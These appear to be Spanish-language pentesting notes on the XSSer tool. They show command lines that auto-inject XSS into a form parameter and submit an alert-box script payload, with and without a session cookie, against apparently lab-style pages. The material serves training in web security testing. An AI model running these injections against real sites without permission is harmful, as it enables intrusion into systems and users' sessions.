# XSSer

Tags: #XSS 

Es una 'framework' automático que detecta, explota y reporta vulnerabilidades XSS en aplicaciones basadas en web.

```bash 
❯ xxser -url "http://IP/hola.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --auto

	# Debemos de colocar la ruta hasta donde se encuentra el XSS
	# p = Colocamos el POST request que nos sale en Burpsuite 
	# XSS es la variable que podemos modificar cuando se presenta el Cross-Site Scripting
	# auto = Intentará mas inyecciones de vulnerabilidades 

❯ xxser -url "http://IP/hola.php" -p "target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS" --Fp "<script>alert(1)</script>"

	# Fp = Podemos insertar un script con sus etiquetas 
```

### XSSer con autenticación 

```bash 
❯ xxser -url "http://IP/hola.php?firstname=XSS&lastname=Villa&form=submit" --cookie="security_level=0; PHPSESSID=kjafhegajsrhf" 

	# Cookie = La cookie de autenticación (Esta la podemos obtener del Burpsuite en el Proxy)
	# XSS = La variable donde la herramienta hace las pruebas de injección 

❯ xxser -url "http://IP/hola.php?firstname=XSS&lastname=Villa&form=submit" --cookie="security_level=0; PHPSESSID=kjafhegajsrhf" --Fp "<script>alert(1)</script>"
```